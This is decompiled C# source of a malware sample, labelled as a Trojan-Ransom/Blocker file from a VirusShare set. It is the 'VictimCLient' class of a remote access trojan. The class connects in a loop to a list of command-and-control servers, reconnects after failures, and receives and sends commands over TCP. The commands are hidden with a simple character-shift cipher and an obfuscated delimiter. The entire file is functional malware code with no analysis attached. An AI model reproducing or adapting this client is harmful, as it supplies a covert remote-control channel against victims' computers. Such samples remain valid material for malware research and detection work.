// Decompiled with JetBrains decompiler
// Type: OpenSource_RAT_Schäding.VictimCLient
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8170AD08-ABA5-4012-BCC7-4CC67D0071A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.ikxa-53f746507d13e73a4ea2419189ad7b0070faaf51b1e13192df858b42ac6c25c0.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace OpenSource_RAT_Schäding
{
  public class VictimCLient
  {
    private bool Verbunden;
    private StreamWriter STW;
    private StreamReader STR;
    private TcpClient TcpC;
    private int I;

    public VictimCLient()
    {
      this.Verbunden = false;
      this.I = 0;
    }

    public event VictimCLient.OnConnectEventHandler OnConnect;

    public event VictimCLient.OnReconnectEventHandler OnReconnect;

    public event VictimCLient.NewMessageEventHandler NewMessage;

    public void Reconnect()
    {
      VictimCLient.OnReconnectEventHandler onReconnectEvent = this.OnReconnectEvent;
      if (onReconnectEvent != null)
        goto label_2;
label_1:
      this.TcpC.Close();
      this.STW.Close();
      this.STR.Close();
      this.Verbunden = false;
      Thread.Sleep(Module2.ReconnectTime);
      this.ConnectToServer();
      return;
label_2:
      onReconnectEvent();
      goto label_1;
    }

    public void Senden(string Text)
    {
      try
      {
        this.STW.WriteLine(this.Verschlüsseln(Text));
        this.STW.Flush();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Start() => new Thread(new ThreadStart(this.ConnectToServer))
    {
      IsBackground = true
    }.Start();

    private void Abhören()
    {
      try
      {
        while (true)
        {
          string[] Befehle;
          VictimCLient.NewMessageEventHandler newMessageEvent;
          do
          {
            Befehle = Strings.Split(this.Entschlüsseln(this.STR.ReadLine()), \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢"));
            newMessageEvent = this.NewMessageEvent;
          }
          while (newMessageEvent == null);
          newMessageEvent(Befehle);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Reconnect();
        ProjectData.ClearProjectError();
      }
    }

    public void Deisconnect()
    {
      this.TcpC.Close();
      this.STW.Close();
      this.STR.Close();
    }

    private void ConnectToServer()
    {
      while (!this.Verbunden)
      {
        try
        {
          if (this.I > checked (Module2.VerbindungsDaten.Count - 1))
          {
            this.I = 0;
            Thread.Sleep(Module2.ReconnectTime);
          }
          this.TcpC = new TcpClient();
          this.TcpC.Connect(Module2.VerbindungsDaten[this.I].IpAdresse, Module2.VerbindungsDaten[this.I].ConnectPort);
          this.STW = new StreamWriter((Stream) this.TcpC.GetStream());
          this.STR = new StreamReader((Stream) this.TcpC.GetStream());
          Module2._Ipadresse = Module2.VerbindungsDaten[this.I].IpAdresse;
          Module2._ConnectionPort = Module2.VerbindungsDaten[this.I].ConnectPort;
          Module2._TransferPort = Module2.VerbindungsDaten[this.I].TransferPort;
          this.Verbunden = true;
          VictimCLient.OnConnectEventHandler onConnectEvent = this.OnConnectEvent;
          if (onConnectEvent != null)
            onConnectEvent();
          this.Abhören();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          checked { ++this.I; }
          this.Verbunden = false;
          ProjectData.ClearProjectError();
        }
      }
    }

    private string Entschlüsseln(string Text) => this.Decrypt(Text);

    private string Verschlüsseln(string Text) => this.Encrypt(Text);

    public string Decrypt(string sText)
    {
      string str = (string) null;
      long num = (long) Strings.Len(sText);
      long Start = 1;
      while (Start <= num)
      {
        str += Conversions.ToString(Strings.Chr(checked (Strings.Asc(Strings.Mid(sText, (int) Start, 1)) - 1)));
        checked { ++Start; }
      }
      return str;
    }

    public string Encrypt(string sText)
    {
      string str = (string) null;
      long num = (long) Strings.Len(sText);
      long Start = 1;
      while (Start <= num)
      {
        str += Conversions.ToString(Strings.Chr(checked (Strings.Asc(Strings.Mid(sText, (int) Start, 1)) + 1)));
        checked { ++Start; }
      }
      return str;
    }

    public delegate void OnConnectEventHandler();

    public delegate void OnReconnectEventHandler();

    public delegate void NewMessageEventHandler(string[] Befehle);
  }
}
